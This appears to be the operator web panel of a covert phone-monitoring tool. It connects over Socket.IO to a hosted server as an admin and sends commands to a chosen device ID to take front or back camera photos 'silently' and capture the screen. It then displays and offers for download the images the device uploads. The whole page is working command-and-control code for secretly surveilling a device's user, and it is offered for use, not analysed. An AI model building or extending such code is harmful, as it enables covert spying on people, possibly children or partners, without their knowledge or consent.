<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Snapshot Menu</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- GLOBAL THEME --- */
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.15);
            --text-main: #ffffff;
            --accent: #00f3ff; /* Cyan */
            --danger: #ff4444;
        }
        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            min-height: 100vh;
        }

        /* --- HEADER --- */
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; }
        .back-btn {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            color: #fff; padding: 10px 15px; border-radius: 12px;
            cursor: pointer; text-decoration: none; font-size: 1rem;
            display: flex; align-items: center; justify-content: center;
        }
        .page-title { 
            font-size: 1.2rem; font-weight: bold; 
            color: var(--accent); text-transform: uppercase; letter-spacing: 1px; 
        }

        /* --- CONTAINER --- */
        .container { width: 100%; max-width: 400px; margin: 0 auto; }

        /* --- LIST ITEMS --- */
        .list-group { margin-bottom: 25px; }
        .list-title { 
            color: #888; font-size: 0.8rem; margin-bottom: 10px; 
            font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
            padding-left: 5px;
        }
        
        .list-item {
            display: flex; align-items: center; gap: 15px;
            background: var(--glass-bg);
            padding: 16px; border-radius: 12px; margin-bottom: 10px;
            cursor: pointer; transition: 0.2s;
            border: 1px solid var(--glass-border);
        }
        .list-item:active { background: rgba(0, 243, 255, 0.1); transform: scale(0.98); border-color: var(--accent); }
        
        .icon-box {
            width: 40px; height: 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.2rem; color: var(--accent);
        }
        
        .text-content { display: flex; flex-direction: column; flex: 1; }
        .main-text { font-size: 1rem; color: #fff; font-weight: 500; }
        .sub-text { font-size: 0.75rem; color: #aaa; margin-top: 3px; }
        
        /* Spinner */
        .spinner {
            border: 2px solid rgba(255,255,255,0.1);
            border-top: 2px solid var(--accent);
            border-radius: 50%; width: 16px; height: 16px;
            animation: spin 1s linear infinite;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* --- BUTTON --- */
        .gallery-btn {
            width: 100%; padding: 15px; border-radius: 12px;
            background: linear-gradient(90deg, var(--accent), #00bcd4);
            color: #000; font-weight: bold; border: none; font-size: 1rem;
            cursor: pointer; margin-top: 20px; box-shadow: 0 4px 15px rgba(0, 243, 255, 0.3);
        }
        .gallery-btn:active { transform: scale(0.98); }

        /* --- ðŸ”¥ POPUP MODAL (NEW) --- */
        .modal {
            display: none; 
            position: fixed; z-index: 1000; left: 0; top: 0;
            width: 100%; height: 100%;
            background-color: rgba(0,0,0,0.9);
            justify-content: center; align-items: center;
            flex-direction: column;
        }
        .modal-content {
            max-width: 90%; max-height: 80%;
            border-radius: 12px;
            border: 2px solid var(--accent);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.5);
        }
        .close-btn {
            position: absolute; top: 20px; right: 30px;
            color: #fff; font-size: 40px; font-weight: bold;
            cursor: pointer;
        }
        .download-link {
            margin-top: 20px;
            padding: 10px 20px; background: var(--accent);
            color: #000; text-decoration: none; border-radius: 8px;
            font-weight: bold;
        }

    </style>
</head>
<body>

    <div id="imageModal" class="modal">
        <span class="close-btn" onclick="closeModal()">&times;</span>
        <img class="modal-content" id="receivedImage">
        <a id="downloadBtn" href="#" class="download-link" download>Download Image</a>
    </div>

    <div class="header">
        <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
        <div class="page-title">Remote Capture</div>
        <div style="width: 40px;"></div> 
    </div>

    <div class="container">
        
        <div class="list-group">
            <div class="list-title">Camera Controls</div>
            
            <div class="list-item" onclick="triggerCommand(this, 'camera_front')">
                <div class="icon-box"><i class="fa-solid fa-user"></i></div>
                <div class="text-content">
                    <div class="main-text">Front Camera</div>
                    <div class="sub-text">Take a selfie silently</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right" style="color:#555; font-size: 0.8rem;"></i>
            </div>

            <div class="list-item" onclick="triggerCommand(this, 'camera')">
                <div class="icon-box"><i class="fa-solid fa-camera"></i></div>
                <div class="text-content">
                    <div class="main-text">Back Camera</div>
                    <div class="sub-text">Capture rear view silently</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right" style="color:#555; font-size: 0.8rem;"></i>
            </div>
        </div>

        <div class="list-group">
            <div class="list-title">Display Controls</div>
            
            <div class="list-item" onclick="triggerCommand(this, 'capture_screen')">
                <div class="icon-box"><i class="fa-solid fa-mobile-screen"></i></div>
                <div class="text-content">
                    <div class="main-text">Screen Shot</div>
                    <div class="sub-text">Capture current screen frame</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right" style="color:#555; font-size: 0.8rem;"></i>
            </div>
        </div>

        <button onclick="goToGallery()" class="gallery-btn">
            <i class="fa-solid fa-images"></i> View Saved Files
        </button>

    </div>

    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com"; 

        const socket = io(SERVER_URL, {
            transports: ['websocket'],
            reconnection: true
        });

        socket.on('connect', () => {
            console.log("âœ… Connected to Server via Socket!");
            // Server ko batao ki main Admin hu (taki mujhe data mile)
            socket.emit('join-admin', { adminId: 'admin123' });
        });

        // 1. DEVICE ID VALIDATION
        const urlParams = new URLSearchParams(window.location.search);
        let DEVICE_ID = urlParams.get('id');

        if (!DEVICE_ID) {
            DEVICE_ID = localStorage.getItem('monitoring_id');
        }

        if (!DEVICE_ID) {
            alert("âš ï¸ Device ID Missing! Please select a device first.");
            window.location.href = 'index.html'; 
        }

        // ===========================================
        // ðŸ”¥ IMAGE RECEIVE LISTENER (YE MISSING THA)
        // ===========================================
        socket.on('file-uploaded', (data) => {
            console.log("ðŸ“© File Received:", data);

            // Check karo ki ye file usi device ki hai jise hum dekh rahe hain
            if (data.deviceId === DEVICE_ID) {
                
                // Spinner band karo
                const spinners = document.querySelectorAll('.spinner');
                spinners.forEach(s => s.style.display = 'none');

                // POPUP Show karo
                showModal(data.fileUrl);
            }
        });

        function showModal(imageUrl) {
            const modal = document.getElementById("imageModal");
            const img = document.getElementById("receivedImage");
            const dlBtn = document.getElementById("downloadBtn");

            img.src = imageUrl;
            dlBtn.href = imageUrl; // Download link set karo
            modal.style.display = "flex"; // Show popup
        }

        function closeModal() {
            document.getElementById("imageModal").style.display = "none";
        }

        // ===========================================
        // COMMAND SENDER
        // ===========================================
        function triggerCommand(element, command) {
            const spinner = element.querySelector('.spinner');
            
            // UI Feedback
            spinner.style.display = "block";
            
            console.log(`Sending command: ${command} to Device: ${DEVICE_ID}`);

            socket.emit('send-command', {
                targetId: DEVICE_ID,
                command: command
            });

            // Timeout hata diya kyunki ab hum real response ka wait kar rahe hain
        }

        function goToGallery() {
            window.location.href = `saved_files.html?id=${DEVICE_ID}`;
        }
    </script>

</body>
</html>
